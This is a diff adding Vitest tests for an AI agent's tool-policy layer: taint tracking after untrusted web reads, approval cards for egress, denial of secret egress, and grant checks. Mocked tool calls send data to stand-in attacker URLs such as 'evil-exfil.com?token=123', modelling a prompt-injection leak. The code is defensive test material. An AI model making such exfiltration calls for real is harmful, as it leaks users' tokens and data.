@@ -2,7 +2,7 @@ import { afterEach, describe, expect, it, vi } from 'vitest';
 import { mkdtempSync, rmSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
-import { Agent, SqliteMemory } from '../packages/core/dist/index.js';
+import { Agent, SqliteMemory, decide, Grants } from '../packages/core/dist/index.js';
 import type { ModelProvider, ModelResponse } from '../packages/models/dist/types.js';
 import type { AgentTool } from '../packages/tools/dist/index.js';
 const resources: Array<() => void> = [];
@@ -98,3 +98,149 @@ describe('agent loop', () => {
     await expect(agent.handle('s', '6', 'hello', undefined, AbortSignal.abort())).rejects.toThrow();
   });
 });
+
+describe('YC-03: ToolManifest, deterministic policy.decide(), and session taint', () => {
+  it('allows web_fetch in clean session, but requires action card once contaminated', () => {
+    const webManifest = {
+      id: 'web_fetch',
+      version: '1.0.0',
+      source: 'builtin' as const,
+      effects: ['read_untrusted' as const, 'egress' as const]
+    };
+
+    // Clean session: decide returns allow
+    const cleanTaint = { contaminated: false, sources: [] };
+    const cleanDecision = decide(
+      webManifest,
+      { v: { url: 'https://example.com' }, labels: [{ origin: 'agent', integrity: 'trusted', secrecy: 'public' }] },
+      cleanTaint
+    );
+    expect(cleanDecision.kind).toBe('allow');
+
+    // Contaminated session: decide returns card per acceptance criteria
+    const dirtyTaint = { contaminated: true, sources: ['web_fetch'] };
+    const dirtyDecision = decide(
+      webManifest,
+      { v: { url: 'https://attacker.com/leak' }, labels: [{ origin: 'agent', integrity: 'untrusted', secrecy: 'public' }] },
+      dirtyTaint
+    );
+    expect(dirtyDecision.kind).toBe('card');
+    if (dirtyDecision.kind === 'card') {
+      expect(dirtyDecision.card.rendered.title).toBe('Fetch External Web URL');
+      expect(dirtyDecision.card.rendered.exact).toBe('https://attacker.com/leak');
+      expect(dirtyDecision.card.rendered.taint).toBe('contaminated');
+      expect(dirtyDecision.card.rendered.effects).toContain('egress');
+    }
+  });
+
+  it('denies egress of secret-labeled values', () => {
+    const webManifest = {
+      id: 'web_fetch',
+      version: '1.0.0',
+      source: 'builtin' as const,
+      effects: ['egress' as const]
+    };
+    const decision = decide(
+      webManifest,
+      { v: { url: 'https://leak.com' }, labels: [{ origin: 'env', integrity: 'trusted', secrecy: 'secret' }] },
+      { contaminated: false, sources: [] }
+    );
+    expect(decision).toEqual({ kind: 'deny', reason: 'secret-egress' });
+  });
+
+  it('denies tools not covered by grants', () => {
+    const shellManifest = {
+      id: 'shell',
+      version: '1.0.0',
+      source: 'builtin' as const,
+      effects: ['exec' as const]
+    };
+    const restrictedGrants = new Grants({ allowedTools: new Set(['file_read']) });
+    const decision = decide(
+      shellManifest,
+      { v: { command: 'pwd' }, labels: [] },
+      { contaminated: false, sources: [] },
+      restrictedGrants
+    );
+    expect(decision).toEqual({ kind: 'deny', reason: 'grant' });
+  });
+
+  it('in Agent loop: Kirli oturumda web_fetch dış hosta kartsız çıkamaz', async () => {
+    const fetchTool: AgentTool = {
+      name: 'web_fetch',
+      description: 'Fetch web page',
+      manifest: {
+        id: 'web_fetch',
+        version: '1.0.0',
+        source: 'builtin',
+        effects: ['read_untrusted', 'egress']
+      },
+      inputSchema: {
+        type: 'object',
+        properties: { url: { type: 'string' } },
+        required: ['url'],
+        additionalProperties: false
+      },
+      requiresApproval: false,
+      execute: vi.fn(async ({ url }) => `fetched: ${url}`)
+    };
+
+    const call1: ModelResponse = {
+      text: '',
+      toolCalls: [{ id: 'call-1', name: 'web_fetch', input: { url: 'https://news.ycombinator.com' } }]
+    };
+    const call2: ModelResponse = {
+      text: '',
+      toolCalls: [{ id: 'call-2', name: 'web_fetch', input: { url: 'https://evil-exfil.com?token=123' } }]
+    };
+
+    const provider = {
+      complete: vi.fn<ModelProvider['complete']>()
+        .mockResolvedValueOnce(call1)
+        .mockResolvedValueOnce(answer('done 1'))
+        .mockResolvedValueOnce(call2)
+        .mockResolvedValueOnce(answer('done 2'))
+    };
+
+    const db = memory();
+    const agent = new Agent(provider, db, [fetchTool]);
+
+    // Step 1: In a clean session, web_fetch executes without card/approval
+    const res1 = await agent.handle('session-sec', 'req-1', 'read news');
+    expect(res1).toBe('done 1');
+    expect(fetchTool.execute).toHaveBeenCalledTimes(1);
+
+    // Session is now contaminated by read_untrusted!
+    expect(agent.getTaint('session-sec').contaminated).toBe(true);
+
+    // Step 2: Now in contaminated session, web_fetch attempts external egress without card approval -> DENIED
+    const res2 = await agent.handle('session-sec', 'req-2', 'send data');
+    expect(res2).toBe('done 2');
+    // The tool call resulted in Tool approval denied error in turn history!
+    expect(provider.complete.mock.calls[3][0].messages.at(-1)).toMatchObject({
+      role: 'tool',
+      callId: 'call-2',
+      error: true,
+      text: 'Tool approval denied'
+    });
+    // execute was NOT called a second time
+    expect(fetchTool.execute).toHaveBeenCalledTimes(1);
+
+    // Step 3: Now with approved card callback, it executes
+    provider.complete
+      .mockResolvedValueOnce(call2)
+      .mockResolvedValueOnce(answer('approved done'));
+
+    const approveCb = vi.fn(async (_call, card) => {
+      expect(card).toBeDefined();
+      expect(card.rendered.taint).toBe('contaminated');
+      return true;
+    });
+
+    const res3 = await agent.handle('session-sec', 'req-3', 'send data with approval', approveCb);
+    expect(res3).toBe('approved done');
+    expect(approveCb).toHaveBeenCalledTimes(1);
+    expect(fetchTool.execute).toHaveBeenCalledTimes(2);
+  });
+});
+
